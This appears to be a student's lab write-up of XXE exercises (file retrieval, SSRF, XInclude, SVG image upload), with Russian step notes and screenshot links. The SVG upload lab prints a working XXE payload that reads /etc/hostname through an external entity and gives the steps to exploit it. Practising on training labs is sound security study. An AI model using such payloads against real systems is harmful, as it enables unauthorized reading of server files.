Lab: Exploiting XXE using external entities to retrieve files

![Image alt](https://github.com/Svizy/Prack-2020/blob/master/xxe/lab_xxe_1.PNG)

Lab: Exploiting XXE to perform SSRF attacks

![Image alt](https://github.com/Svizy/Prack-2020/blob/master/xxe/lab_xxe_2.PNG)

Lab: Exploiting XInclude to retrieve files

![Image alt](https://github.com/Svizy/Prack-2020/blob/master/xxe/lab_xxe_3.PNG)

Lab: Exploiting XXE via image file upload

Создайте локальный образ SVG со следующим содержимым:
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
И закидываем на сайт в комментарии:
![Image alt](https://github.com/Svizy/Prack-2020/blob/master/xxe/lab_xxe_4_1.PNG)
Смотрим код страницы где оставлен комментарий и ищем пикчу с содержимом в нем коде:
![Image alt](https://github.com/Svizy/Prack-2020/blob/master/xxe/lab_xxe_4_2.PNG)
Пикча с кодом:
![Image alt](https://github.com/Svizy/Prack-2020/blob/master/xxe/lab_xxe_4_3.png)
Вводим код с картинки
![Image alt](https://github.com/Svizy/Prack-2020/blob/master/xxe/lab_xxe_4_4.PNG)
Работает)
![Image alt](https://github.com/Svizy/Prack-2020/blob/master/xxe/lab_xxe_4_5.PNG)
